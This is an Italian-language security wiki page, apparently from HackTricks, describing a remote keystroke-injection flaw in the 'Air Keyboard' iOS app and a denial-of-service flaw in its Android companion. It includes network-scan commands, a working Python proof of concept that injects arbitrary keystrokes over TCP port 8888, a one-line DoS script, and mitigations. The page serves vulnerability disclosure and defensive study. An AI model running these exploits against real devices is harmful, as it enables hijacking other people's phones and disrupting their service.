# Air Keyboard Remote Input Injection (Listener TCP non autenticato)

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

La versione iOS dell'applicazione commerciale "Air Keyboard" (ID App Store 6463187929) apre un **servizio TCP in chiaro sulla porta 8888** che accetta frame di tasti **senza alcuna autenticazione**. Qualsiasi dispositivo sulla stessa rete Wi-Fi può connettersi a quella porta e iniettare input da tastiera arbitrari nel telefono della vittima, ottenendo **un completo dirottamento dell'interazione remota**.

Una build Android complementare ascolta sulla **porta 55535**. Esegue un debole handshake AES-ECB, ma dati malformati causano un **eccezione non gestita nella routine di decrittazione OpenSSL**, causando il crash del servizio in background (**DoS**).

## 1. Scoperta del Servizio

Scansiona la rete locale e cerca le due porte fisse utilizzate dalle app:
```bash
# iOS (input-injection)
nmap -p 8888 --open 192.168.1.0/24

# Android (weakly-authenticated service)
nmap -p 55535 --open 192.168.1.0/24
```
Su dispositivi Android puoi identificare il pacchetto responsabile localmente:
```bash
adb shell netstat -tulpn | grep 55535     # no root required on emulator

# rooted device / Termux
netstat -tulpn | grep LISTEN
ls -l /proc/<PID>/cmdline                # map PID → package name
```
## 2. Formato del Frame (iOS)

Il binario rivela la seguente logica di parsing all'interno della routine `handleInputFrame()`:
```
[length (2 bytes little-endian)]
[device_id (1 byte)]
[payload ASCII keystrokes]
```
La lunghezza dichiarata include il byte `device_id` **ma non** l'intestazione di due byte stessa.

## 3. Exploitation PoC
```python
#!/usr/bin/env python3
"""Inject arbitrary keystrokes into Air Keyboard for iOS"""
import socket, sys

target_ip = sys.argv[1]                  # e.g. 192.168.1.50
keystrokes = b"open -a Calculator\n"     # payload visible to the user

frame  = bytes([(len(keystrokes)+1) & 0xff, (len(keystrokes)+1) >> 8])
frame += b"\x01"                         # device_id = 1 (hard-coded)
frame += keystrokes

with socket.create_connection((target_ip, 8888)) as s:
s.sendall(frame)
print("Injected", keystrokes)
```
Qualsiasi ASCII stampabile (inclusi `\n`, `\r`, tasti speciali, ecc.) può essere inviato, concedendo effettivamente all'attaccante lo stesso potere dell'input utente fisico: avviare app, inviare messaggi, visitare URL di phishing, ecc.

## 4. Android Companion – Denial-of-Service

La porta Android (55535) si aspetta una password di 4 caratteri crittografata con una **chiave AES-128-ECB hard-coded** seguita da un nonce casuale. Gli errori di parsing risalgono a `AES_decrypt()` e non vengono catturati, terminando il thread del listener. Un singolo pacchetto malformato è quindi sufficiente per mantenere gli utenti legittimi disconnessi fino a quando il processo non viene rilanciato.
```python
import socket
socket.create_connection((victim, 55535)).send(b"A"*32)  # minimal DoS
```
## 5. Causa Principale

1. **Nessun controllo di origine / integrità** sui frame in arrivo (iOS).
2. **Uso improprio della crittografia** (chiave statica, ECB, mancanza di validazione della lunghezza) e **mancanza di gestione delle eccezioni** (Android).

## 6. Mitigazioni e Idee di Indurimento

* Non esporre mai servizi non autenticati su un dispositivo mobile.
* Derivare segreti per dispositivo durante l'onboarding e verificarli prima di elaborare l'input.
* Legare il listener a `127.0.0.1` e utilizzare un trasporto crittografato e autenticato reciprocamente (ad es., TLS, Noise) per il controllo remoto.
* Rilevare porte aperte inaspettate durante le revisioni di sicurezza mobile (`netstat`, `lsof`, `frida-trace` su `socket()` ecc.).
* Come utente finale: disinstallare Air Keyboard o utilizzarlo solo su reti Wi-Fi fidate e isolate.

## Scheda di Rilevamento (Pentester)
```bash
# Quick one-liner to locate vulnerable devices in a /24
nmap -n -p 8888,55535 --open 192.168.1.0/24 -oG - | awk '/Ports/{print $2,$3,$4}'

# Inspect running sockets on a connected Android target
adb shell "for p in $(lsof -PiTCP -sTCP:LISTEN -n -t); do echo -n \"$p → "; cat /proc/$p/cmdline; done"
```
## Riferimenti

- [Vulnerabilità di Iniezione di Input Remoto nell'App Air Keyboard iOS Ancora Non Risolta](https://www.mobile-hacker.com/2025/07/17/remote-input-injection-vulnerability-in-air-keyboard-ios-app-still-unpatched/)
- [Avviso CXSecurity WLB-2025060015](https://cxsecurity.com/issue/WLB-2025060015)

{{#include ../../banners/hacktricks-training.md}}
